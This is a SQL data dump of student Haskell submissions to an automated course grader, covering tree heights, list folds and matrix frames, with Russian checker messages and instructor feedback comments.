(825, 39, '517309', '2012-09-21 15:49:59', 0, 'mimHeight Empty = 1000\r\nmimHeight (Node _ Empty Empty) = 0\r\nmimHeight (Node _ l r) = 1 + min (mimHeight l) (mimHeight r) \r\n', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(826, 39, '517309', '2012-09-21 15:50:24', 0, 'mimHeight _ = 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(827, 39, '517309', '2012-09-21 15:51:03', 0, 'minHeight _ = 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(828, 39, '517309', '2012-09-21 15:52:44', 0, 'minHeight _ = 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(829, 39, '517309', '2012-09-21 15:53:24', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nminHeight Empty = 0\r\nminHeight t = minNodes t - 1\r\n\r\nmi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight = mi', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(830, 39, '517309', '2012-09-21 15:54:11', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nmi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight x = mi x', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(831, 39, '517309', '2012-09-21 15:56:23', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nmi Empty = 1000\r\nmi (Node _ Empty Empty) = 0\r\nmi (Node _ l r) = 1 + min (mi l) (mi r) \r\n\r\nminHeight x = mi x', '<br/>Тесты успешно пройдены!'),
(832, 39, 'Deutsche', '2012-09-21 15:57:33', 2, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1/0)\r\nminHeight1 Empty h res = if (h<res) \r\n				then h \r\n			 else res\r\nminHeight1 (Node x Empty Empty) h res = if (h<res) \r\n						then h \r\n					else res\r\nminHeight1 (Node x l r) h res = if (h<res) \r\n					then min (minHeight1 l (h+1) res) (minHeight1 r (h+1) res)\r\n				else res\r\n   --- ОК, резульатаы у вас  все правильные, это у меня тест был неправильный.\r\n   --- Но не совсем то, мне кажется, потому что, когда вы обходите справа ((minHeight1 r (h+1) res) )\r\n   --- то вы в качестве ограничения (res) используете то, что получили в качестве параметра.\r\n   --- А надо бы = то, что вы насчитали после обхода слева. Понятно примерно да? Если не очень, напишиите, пожалуйста, я напищу подробнее.\r\n   --- Попроьуйте исправить, пожалусйта', '<br/>Тесты успешно пройдены!'),
(833, 39, '517309', '2012-09-21 16:01:33', 0, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1/0)\r\nminHeight1 Empty h res = if (h<res) \r\n				then h \r\n			 else res\r\nminHeight1 (Node x Empty Empty) h res = if (h<res) \r\n						then h \r\n					else res\r\nminHeight1 (Node x l r) h res = if (h<res) \r\n					then min (minHeight1 l (h+1) res) (minHeight1 r (h+1) res)\r\n				else res', '<br/>Тесты успешно пройдены!'),
(834, 39, '517309', '2012-09-21 17:10:19', 0, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1/0)\r\nminHeight1 Empty h res = if (h<res) \r\n                then h \r\n             else res\r\nminHeight1 (Node x Empty Empty) h res = if (h<res) \r\n                        then h \r\n                    else res\r\nminHeight1 (Node x l r) h res = if (h<res) \r\n                    then min (minHeight1 l (h+1) res) (minHeight1 r (h+1) res)\r\n                else res', '<br/>Тесты успешно пройдены!'),
(835, 39, '517309', '2012-09-21 17:24:04', 3, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1/0)\r\nminHeight1 Empty h res = if (h < res) \r\n                then h \r\n             else res\r\nminHeight1 (Node x Empty Empty) h res = if (h < res) \r\n                        then h \r\n                    else res\r\nminHeight1 (Node x l r) h res = if (h < res) \r\n                    then min (minHeight1 l (h+1) res) (minHeight1 r (h+1) res)\r\n                else res', '<br/>Тесты успешно пройдены!'),
(836, 31, '374969', '2012-09-21 17:51:22', 1, '--canPush x [] = True\r\n--canPush x (hd:tl) = x > hd\r\n\r\ncanPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\n-- Условие почти эквивалентно требуемому, т.к. если у нас разница стала больше оставшейся части,\r\n-- то в одном из списков мы положили больше половины\r\nparts2h (hd:tl) lst1 lst2 staylst def = if(def > staylst) then False else \r\n                                        if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (staylst-1) (def+1)) || x()\r\n   --- Тут лучше просто x\r\n                                        else x()\r\n                                        where x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (staylst-1) (def-1))\r\n   --- А тут тогда просто x = canPush и т.д.\r\n   --- (Поскольку Хаскел - ленивый язык, то в нем нет никакой разницы между константой и функцией без параметров)\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', '<br/>Тесты успешно пройдены!'),
(837, 42, '533223', '2012-09-21 17:53:10', 1, 'myfoldl f e [] = e\r\nmyfoldl f e (x:xs) = myfoldl f (e `f` x) xs', '<br/>Тесты успешно пройдены!'),
(838, 35, '63706456', '2012-09-21 18:09:09', 1, 'isosc a b c = 	not $ (dist a b /= (dist b c)) &&\r\n		(dist b c /= (dist c a)) &&\r\n		(dist c a /= (dist a b))\r\n		where dist (a,b) (c,d) = (a-c)^2 + (b-d)^2\r\n   --- ОК, но я бы немного дописал, чтобы не считать каждый dist по 2 раза.', '<br/>Тесты успешно пройдены!'),
(839, 37, '374969', '2012-09-21 18:09:51', 0, 'minsum lst = min [ x+y | (x,i) <- hlst, (y,j) <- hlst, i + 1 == j] where hlst = zip lst [0..]', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(840, 36, '63706456', '2012-09-21 18:11:52', 1, 'cubeTable n = map (x-> (x,x^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(841, 37, '374969', '2012-09-21 18:12:01', 1, 'minsum lst = minimum [ x+y | (x,i) <- hlst, (y,j) <- hlst, i + 1 == j] where hlst = zip lst [0..]\r\n  --- ОК, хорошо (но можно более эффективно, это мы обсудим..)', '<br/>Тесты успешно пройдены!'),
(842, 37, '63706456', '2012-09-21 18:32:49', 0, 'minsum xs = foldr1 min $ tail $ foldr (x (y:ys) -> (x:(x+y):ys)) [1/0]', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(843, 37, '63706456', '2012-09-21 18:33:24', 1, 'minsum xs = foldr1 min $ tail $ foldr (x (y:ys) -> (x:(x+y):ys)) [1/0] xs', '<br/>Тесты успешно пройдены!'),
(844, 38, '63706456', '2012-09-21 18:54:33', 1, 'data Tree = Node Integer Tree Tree | Empty deriving Show\r\n\r\nheight Empty = -1\r\nheight (Node _ a b) = 1 + max (height a) (height b) ', '<br/>Тесты успешно пройдены!'),
(845, 39, 'Deutsche', '2012-09-21 19:13:25', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nminHeight Empty = 0\r\nminHeight (Node x Empty Empty) = 0\r\nminHeight (Node x l r) = minHeight1 (Node x l r) 0 (1000)\r\nminHeight1 Empty h res = if (h < res) \r\n				then h \r\n			 else res\r\nminHeight1 (Node x Empty Empty) h res = if (h < res) \r\n						then h \r\n					else res\r\nminHeight1 (Node x l r) h res = if (h < res) \r\n					then \r\n					let\r\n						a = minHeight1 l (h+1) res\r\n					in min (a) (minHeight1 r (h+1) a)\r\n				else res', '<br/>Тесты успешно пройдены!'),
(846, 39, '63706456', '2012-09-21 20:01:15', 0, 'minHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = minHeightAcc [l,r] [] 1\r\n\r\nminHeightAcc ((Node _ Empty Empty):xs) _ n = n\r\nminHeightAcc ((Node _ l r):xs) ys n = minHeightAcc xs (l:r:ys) n\r\nminHeightAcc [] ys n = minHeightAcc ys [] (n+1)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(847, 39, '63706456', '2012-09-21 20:03:16', 0, 'minHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = minHeightAcc [l,r] [] 1\r\n\r\nminHeightAcc ((Node _ Empty Empty):xs) _ n = n\r\nminHeightAcc ((Node _ l r):xs) ys n = minHeightAcc xs (l:r:ys) n\r\nminHeightAcc [] ys n = minHeightAcc ys [] (n+1)', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(848, 39, '63706456', '2012-09-21 20:03:36', 0, 'data Tree = Node Integer Tree Tree | Empty deriving Show\r\n\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = minHeightAcc [l,r] [] 1\r\n\r\nminHeightAcc ((Node _ Empty Empty):xs) _ n = n\r\nminHeightAcc ((Node _ l r):xs) ys n = minHeightAcc xs (l:r:ys) n\r\nminHeightAcc [] ys n = minHeightAcc ys [] (n+1)', '<br/>Тесты успешно пройдены!'),
(849, 39, '63706456', '2012-09-21 20:27:09', 1, 'data Tree = Node Integer Tree Tree | Empty deriving Show\r\n\r\nminHeight (Node _ Empty Empty) = 0\r\nminHeight (Node _ l r) = minHeightAcc [l,r] [] 1\r\n\r\n--в предыдущем вариате паттерн-матчинг неполон\r\nminHeightAcc ((Node _ Empty Empty):xs) _ n = n\r\nminHeightAcc (Empty:xs) ys n = minHeightAcc xs ys n\r\nminHeightAcc ((Node _ l r):xs) ys n = minHeightAcc xs (l:r:ys) n\r\nminHeightAcc [] ys n = minHeightAcc ys [] (n+1)', '<br/>Тесты успешно пройдены!'),
(850, 35, '533223', '2012-09-21 21:44:48', 0, 'cubeTable n = map c [1..n]\r\nc n = (n, n*n*n)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(851, 40, 'Deutsche', '2012-09-21 21:44:50', 1, 'frame n = if (n == 0) \r\n		then [[]]\r\n          else\r\n	  if (n == 1) \r\n		then [[1]]\r\n	  else \r\n	   let \r\n		s1 = 1:[0 | x <- [1..(n-2)]] ++ [1]\r\n		s2 = [s1 | x <- [1..(n-2)]]\r\n		s3 = [1 | x <- [1..n]]\r\n		s4 = (s3 : s2) ++ [s3]\r\n	   in s4', '<br/>Тесты успешно пройдены!'),
(852, 36, '533223', '2012-09-21 21:45:06', 1, 'cubeTable n = map c [1..n]\r\nc n = (n, n*n*n)', '<br/>Тесты успешно пройдены!'),
(853, 41, '533223', '2012-09-21 22:23:58', 1, 'countOdd ys = foldr (x  res ->if ((rem x 2)==1)then res+1 else res) 0 ys\r\n\r\ncountOdd1 ys = foldr (x res -> res+1) 0 (filter (x->(rem x 2)==1 )ys)', '<br/>Тесты успешно пройдены!'),
(854, 35, '2562137', '2012-09-21 22:24:45', 1, 'isosc p1 p2 p3 =\r\n	a == b || b == c || a == c\r\n	where\r\n		a = dist p1 p2\r\n		b = dist p2 p3\r\n		c = dist p1 p3\r\n		dist p q = sqr (fst p - fst q) + sqr (snd p - snd q)\r\n		sqr x = x * x\r\n', '<br/>Тесты успешно пройдены!'),
(855, 36, '2562137', '2012-09-21 22:29:51', 1, 'cubeTable n = map (x -> (x, x^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(856, 35, 'erwert', '2012-09-21 22:49:13', 1, 'isosc x y z = if (len x y == len x z) || (len x y == len y z) || (len y z == len x z) then True else False\r\n  --- Или просто isosc x y z = (len x y == len x z) || (len x y == len y z) || (len y z == len x z)\r\n  --- И еще лучше, чтобы длины считались один раз (с помощью let, например) \r\n\r\nlen (x1,y1) (x2,y2) = (x2-x1)^2 + (y1-y2)^2', '<br/>Тесты успешно пройдены!'),
(857, 41, 'erwert', '2012-09-21 22:49:30', 0, 'countOdd (x:xs) = foldr (+) (x `mod` 2) [t `mod` 2 | t <- xs]\r\ncountOdd1 x = foldl (+) 0 (map ( `mod` 2) x)', 'Не удалось вычислить выражение "countOdd []", проверьте правильность синтаксиса'),
(858, 41, 'erwert', '2012-09-21 22:49:57', 0, 'coundOdd [] = 0\r\ncountOdd (x:xs) = foldr (+) (x `mod` 2) [t `mod` 2 | t <- xs]\r\ncountOdd1 x = foldl (+) 0 (map ( `mod` 2) x)', 'Не удалось вычислить выражение "countOdd []", проверьте правильность синтаксиса'),
(859, 41, 'erwert', '2012-09-21 22:52:00', 1, 'countOdd [] = 0\r\ncountOdd (x:xs) = foldr (+) (x `mod` 2) [t `mod` 2 | t <- xs]\r\ncountOdd1 x = foldl (+) 0 (map ( `mod` 2) x)', '<br/>Тесты успешно пройдены!'),
(860, 35, '533223', '2012-09-21 23:00:45', 0, 'isosс x1 x2 x3= which (f1 x1 x2 x3) \r\nf1 (x1,x2) (y1,y2) (z1,z2) = [(l x1 x2 y1 y2),(l z1 z2 y1 y2),(l x1 x2 z1 z2)]\r\n				where l x y z t = (x-z)*(x-z)+(y-t)*(y-t)\r\n\r\nwhich [x,y,z] = if(x==y||y==z||z==x) then True\r\n					else False', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(861, 35, '533223', '2012-09-21 23:04:13', 1, 'isosс x1 x2 x3= which (f1 x1 x2 x3)\r\n --- Тут у вас русские буквы в имени.. \r\nf1 (x1,x2) (y1,y2) (z1,z2) = [(l x1 x2 y1 y2),(l z1 z2 y1 y2),(l x1 x2 z1 z2)]\r\n				where l x y z t = (x-z)*(x-z)+(y-t)*(y-t)\r\n\r\nwhich [x,y,z] = if(x==y||y==z||z==x) then True\r\n					else False\r\n   --- Ну или просто which [x,y,z] =(x==y||y==z||z==x)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(862, 37, '2562137', '2012-09-21 23:05:43', 1, 'minsum list = foldr (min) (1/0) (map (x -> fst x + snd x) (zip list (tail list)))', '<br/>Тесты успешно пройдены!'),
(863, 38, '2562137', '2012-09-21 23:10:46', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nheight node = nodeHeight node - 1\r\n\r\nnodeHeight Empty = 0\r\nnodeHeight (Node x l r) = 1 + max (nodeHeight l) (nodeHeight r)', '<br/>Тесты успешно пройдены!'),
(864, 40, '2562137', '2012-09-21 23:16:47', 1, 'frame n = genList n (genList n 1 1) (genList n 1 0)\r\n\r\ngenList len end mid =\r\n	map (x -> if x == 1 || x == len then end else mid) [1..len]', '<br/>Тесты успешно пройдены!'),
(865, 41, '2562137', '2012-09-21 23:25:32', 1, 'countOdd list = foldr (x -> y -> (x `mod` 2) + y) 0 list \r\ncountOdd1 list = foldr (+) 0 (map (`mod` 2) list)', '<br/>Тесты успешно пройдены!'),
(866, 42, '2562137', '2012-09-21 23:39:39', 1, 'myfoldl fun def list = foldr (flip fun) def (reverse list)\r\n  --- ОК, засчитано, но вообще эффективнее, конечно, написать это же без reverse, тем более это совсем не сложно. ', '<br/>Тесты успешно пройдены!'),
(867, 39, '2562137', '2012-09-22 00:32:31', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nisEmpty Empty = True\r\nisEmpty _ = False\r\n\r\nisLeaf (Node x l r) = isEmpty l && isEmpty r\r\n\r\nminHeight node = f node (1/0) 0\r\n\r\nf Empty _ _ = 1/0\r\nf (Node x l r) knownMin currDepth =\r\n	if currDepth >= knownMin then knownMin\r\n	else\r\n		if isLeaf (Node x l r) then currDepth\r\n		else f l (f r knownMin (currDepth+1)) (currDepth+1)\r\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(868, 39, '2562137', '2012-09-22 00:35:49', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nisEmpty Empty = True\r\nisEmpty _ = False\r\n\r\nisLeaf (Node x l r) = isEmpty l && isEmpty r\r\n\r\nminHeight node = f node 0 (1/0)\r\n\r\nf Empty _ _ = 1/0\r\nf (Node x l r) currDepth knownMin =\r\n	if currDepth >= knownMin then knownMin\r\n	else\r\n		if isLeaf (Node x l r) then currDepth\r\n		else min knownMin (f l (currDepth+1) (min knownMin (f r (currDepth+1) knownMin)))\r\n    --- ОК, правильно, очень хорошо, но в последней строке оба раза min не нужен. \r\n    --- Ведь ваш алгоритм устроен так, что функция f в принципе не может вернуть число, большее knownMin', '<br/>Тесты успешно пройдены!'),
(869, 40, 'erwert', '2012-09-22 02:22:22', 0, 'frame n = [if mod t n < 2 then [1 | p <- [1..n]] else [1] ++ [0 | p <- [1..n-2]] ++ [1] | t <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(870, 40, 'erwert', '2012-09-22 03:05:42', 1, 'frame n = [[if (mod t n > 1) && (mod p n > 1) then 0 else 1 | p <- [1..n]] | t <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(871, 31, '517309', '2012-09-22 06:20:27', 0, 'canPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\nparts2h (hd:tl) lst1 lst2 staylst def = if(def > staylst) then False else \r\n                                        if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (staylst-1) (def+1)) || x\r\n                                        else x\r\n                                        where x = canPush hd lst && parts2h tl lst1 (hd:lst2) (staylst-1) (def-1)\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(872, 31, '517309', '2012-09-22 06:22:27', 0, 'canPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\nparts2h (hd:tl) lst1 lst2 staylst def = \r\n   if(def > staylst) then False \r\n    else if(canPush hd lst1) \r\n      then \r\n         parts2h tl (hd:lst1) lst2 \r\n                 (staylst-1) (def+1) || \r\n           x\r\n      else x\r\n        where \r\n          x = \r\n            canPush hd lst && \r\n            parts2h tl lst1 (hd:lst2) \r\n                    (staylst-1) (def-1)\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(873, 31, '517309', '2012-09-22 06:23:44', 0, '--canPush x [] = True\r\n--canPush x (hd:tl) = x > hd\r\n\r\ncanPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\n-- Условие почти эквивалентно требуемому, т.к. если у нас разница стала больше оставшейся части,\r\n-- то в одном из списков мы положили больше половины\r\nparts2h (hd:tl) lst1 lst2 staylst def = if(def > staylst) then False else \r\n                                        if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (staylst-1) (def+1)) || x()\r\n                                        else x()\r\n                                        where x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (staylst-1) (def-1))\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(874, 31, '517309', '2012-09-22 06:24:45', 0, '--canPush x [] = True\r\n--canPush x (hd:tl) = x > hd\r\n\r\ncanPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\nparts2h (hd:tl) lst1 lst2 staylst def = if(def > staylst) then False else \r\n                                        if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (staylst-1) (def+1)) || x()\r\n                                        else x()\r\n                                        where x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (staylst-1) (def-1))\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(875, 31, '517309', '2012-09-22 06:25:08', 0, 'parts2 _ = True', 'Выражение имеет неправильное значение: parts2 [1, 2, 3, 5, 1, 7]'),
(876, 31, '517309', '2012-09-22 06:25:47', 3, '--canPush x [] = True\r\n--canPush x (hd:tl) = x > hd\r\n\r\ncanPush x lst = lst==[]||x > head lst\r\n\r\nparts2h [] _ _ _ def = def == 0\r\n-- Условие почти эквивалентно требуемому, т.к. если у нас разница стала больше оставшейся части,\r\n-- то в одном из списков мы положили больше половины\r\nparts2h (hd:tl) lst1 lst2 staylst def = if(def > staylst) then False else \r\n                                        if(canPush hd lst1) then (parts2h tl (hd:lst1) lst2 (staylst-1) (def+1)) || x()\r\n                                        else x()\r\n                                        where x = () -> (canPush hd lst2) && (parts2h tl lst1 (hd:lst2) (staylst-1) (def-1))\r\n                                \r\nparts2 lst = parts2h lst [] [] (length lst) 0', 'Не удалось вычислить выражение "parts2 [1, 3, 1, 8, 4, 9]", проверьте правильность синтаксиса'),
(877, 22, 'Deutsche', '2012-09-22 09:43:08', 1, 'g :: Integer -> Bool\r\nisprime :: Integer -> Integer -> Bool\r\ng1 :: Integer -> Integer -> Integer -> Bool\r\n\r\ng n | n<=4 = False\r\n    | otherwise = g1 n 2 (n-2)\r\n\r\nisprime k m | k*k>m = True\r\n            | m `mod` k == 0 = False\r\n	    | otherwise	= isprime (k+1) m\r\n\r\ng1 n a b | a + a > n = False\r\n	 | b/=a = if ((isprime 2 a)&&(isprime 2 b)) then True else g1 n (a+1) (b-1)\r\n	 | otherwise = False', '<br/>Тесты успешно пройдены!'),
(878, 35, '355679', '2012-09-22 10:11:02', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = \r\n\r\n	let 	d12 = (x1 - x2) ^ 2 + (y1 - y2) ^ 2\r\n\r\n		d23 = (x3 - x2) ^ 2 + (y3 - y2) ^ 2\r\n\r\n		d13 = (x1 - x3) ^ 2 + (y1 - y3) ^ 2\r\n\r\n		in (d12 == d23) || (d12 == d13) || (d23 == d13)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(879, 36, '355679', '2012-09-22 10:11:20', 1, 'cubeTable (n) = zip [1..n] (map (^3) [1..n])\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(880, 37, '355679', '2012-09-22 10:11:34', 2, '  --- Вы, наверное, невнимателбно прочитали условие. Там ведь написано:  \r\n  --- "_Нельзя_ определять свои рекурсивные функции. Т.е. можно (и нужно) использовать стандартные функции."\r\n  --- ОК, одна стандартная функция, которую можно использовать - это minimum - это то же, что minlist\r\n  --- Вам остается придумать, как записать minsum1 через стандартные функции, без рекурсии\r\nminlist (x:[]) = x\r\n\r\nminlist (x:y:z) = if x < y then minlist (x:z) else minlist (y:z)\r\n\r\n\r\n\r\nminsum a = let minsum1 (x:y:[]) = [x + y]\r\n\r\n	       minsum1 (x:y:z) = (x + y) : minsum1 (y : z)\r\n\r\n	       in minlist (minsum1 a)\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(881, 38, '355679', '2012-09-22 10:15:15', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nheight Empty			= 0\r\n\r\nheight (Node _ Empty Empty)	= 0\r\n\r\nheight (Node i l r)		= 1 + ( max (height l) (height r) )\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(882, 40, '355679', '2012-09-22 10:35:39', 1, 'frame n = frame1 0 n\r\n\r\n\r\n\r\nframe1 i n = if (i < n)\r\n\r\n		then (row i 0 n):(frame1 (i + 1) n)\r\n\r\n		else []\r\n\r\n\r\n\r\nrow i j n = if (j < n)\r\n\r\n		then (cell i j n):(row i (j + 1) n)\r\n\r\n		else []\r\n\r\n\r\n\r\ncell i j n = if ( ((max i j) == (n - 1)) || ((min i j) == 0) )\r\n\r\n		then 1\r\n\r\n		else 0\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(883, 41, '355679', '2012-09-22 10:56:50', 1, 'countOdd = foldr \r\n\r\n	(x res -> if mod x 2 == 1 \r\n\r\n			then res + 1\r\n\r\n			else res\r\n\r\n	)\r\n\r\n	0\r\n\r\n\r\n\r\ncountOdd1 = length . (filter (x -> mod x 2 == 1))\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(884, 42, '355679', '2012-09-22 11:02:47', 1, 'myfoldl _ res []	= res\r\n\r\nmyfoldl f res (x:xs)	= myfoldl f (f res x) xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(885, 35, '12206137', '2012-09-22 13:36:40', 1, 'isosc a b c =\r\n\r\n    let len (x1,y1) (x2,y2) = (x2-x1)^2 + (y2-y1)^2 in\r\n\r\n    let (l1, l2, l3) = (len a b, len a c, len b c) in\r\n\r\n    l1 == l2 || l1 == l3 || l2 == l3\r\n', '<br/>Тесты успешно пройдены!'),
(886, 42, 'erwert', '2012-09-22 13:38:24', 1, 'myfoldl cond q [] = q\r\nmyfoldl cond q (x:xs) = myfoldl cond (cond q x) xs', '<br/>Тесты успешно пройдены!'),
(887, 36, '12206137', '2012-09-22 13:38:52', 1, 'cubeTable n = map (x -> (x, x^3)) [1..n]\r\n', '<br/>Тесты успешно пройдены!'),
(888, 37, '12206137', '2012-09-22 13:57:04', 1, '(|>) x y = y x\r\n\r\n\r\n\r\nminsum (x:xs) =\r\n\r\n    xs |> foldl ( (prev, acc) cur -> (cur, prev+cur : acc)) (x,[])\r\n\r\n    |> snd |> minimum\r\n', '<br/>Тесты успешно пройдены!'),
(889, 38, '12206137', '2012-09-22 14:05:08', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nheight'' Empty = -1\r\n\r\nheight'' (Node _ left right) = 1 + max (height'' left) (height'' right)\r\n\r\n\r\n\r\nheight tree = max 0 (height'' tree)\r\n   --- Да я бы просто считал, что для пустого дерева высота равна -1. Это не противоречит\r\n   --- оперделению "минимум расстояния от корня до листа" потому что у нас тут нет ни корня ни листа:)\r\n   --- Поэтому мне кажется мы вполне имеем право взять то опредедение, какое нам удобнее\r\n', '<br/>Тесты успешно пройдены!'),
(890, 39, '12206137', '2012-09-22 14:41:47', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\n\r\n\nminHeight'' curRes acc Empty = min curRes $ acc - 1\r\n\nminHeight'' curRes acc (Node _ left right)\r\n\n    | curRes <= acc = curRes\r\n\n    | otherwise =\r\n\n        let leftRes = minHeight'' curRes (acc+1) left in\r\n\n        case () of\r\n\n            _ | leftRes <= acc -> leftRes\r\n\n              | otherwise -> minHeight'' leftRes (acc+1) right\r\n\n    \r\n\nminHeight tree = round $ max 0 $ minHeight'' (1/0) 0 tree\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
(891, 39, '12206137', '2012-09-22 14:47:20', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\n\r\n\r\nminHeight'' curRes acc Empty = curRes\r\n\r\nminHeight'' curRes acc (Node _ Empty Empty) = min curRes acc\r\n\r\nminHeight'' curRes acc (Node _ left right)\r\n\r\n    | curRes <= acc + 1 = curRes\r\n\r\n    | otherwise =\r\n\r\n        let leftRes = minHeight'' curRes (acc+1) left in\r\n\r\n        if leftRes <= acc + 1 then leftRes\r\n\r\n        else minHeight'' leftRes (acc+1) right\r\n\r\n    \r\n\r\nminHeight tree = round $ max 0 $ minHeight'' (1/0) 0 tree\r\n   --- ОК, но я бы вместо 1/0 написал бы 10000 (ну или 10^100 :), \r\n   --- тогда бы ответ был целым и его не надо было бы округлять', '<br/>Тесты успешно пройдены!'),
(892, 40, '12206137', '2012-09-22 14:52:23', 1, 'frame n \r\n\r\n    | n == 0 = []\r\n\r\n    | n == 1 = [[1]]\r\n\r\n    | otherwise =\r\n\r\n        let topAndBottom = replicate n 1 in\r\n\r\n        topAndBottom : (replicate (n-2) (1 : replicate (n-2) 0 ++ [1])) ++ [topAndBottom]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(893, 39, '355679', '2012-09-22 15:18:33', 0, 'data Tree = Empty | Node Integer Tree Tree\n\n\n\nminHeight node = (minHeight1 (1 / 0) 0 node) - 1\n\n\n\n--counts nodes on the shortest way to a leaf--\n\nminHeight1 minH	cur (Empty) = min cur minH\n\nminHeight1 minH	cur (Node _ l r) =\n\n	if cur < minH - 1 then\n\n		minHeight1 (minHeight1 minH (cur + 1) l) (cur + 1) r\n\n	else \n\n		minH\n\n\n', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 Empty (Node 3 Empty Empty)) (Node 4 (Node 5 Empty Empty) Empty))'),
